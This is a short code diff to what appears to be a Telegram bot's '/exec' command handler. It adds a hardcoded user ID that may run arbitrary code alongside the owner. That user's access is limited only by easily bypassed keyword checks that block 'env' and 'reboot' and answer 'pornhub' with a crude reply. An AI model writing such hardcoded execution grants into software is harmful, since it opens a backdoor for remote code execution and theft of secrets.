@@ -119,8 +119,19 @@ async def aexec(code, smessatatus):
 
 @Cbot(pattern="^/exec ?(.*)")
 async def msg(event):
-    if not event.sender_id == OWNER_ID:
-        return
+    if event.sender_id == OWNER_ID:
+        pass
+    elif event.sender_id == 865058466:
+        if 'pornhub' in event.text:
+           return await event.reply("Horny.")
+        elif 'env' in event.text:
+           return
+        elif 'reboot' in event.text:
+            return
+        else:
+            pass
+    else:
+       return
     if event.fwd_from:
         return
     cmd = "".join(event.message.message.split(maxsplit=1)[1:])
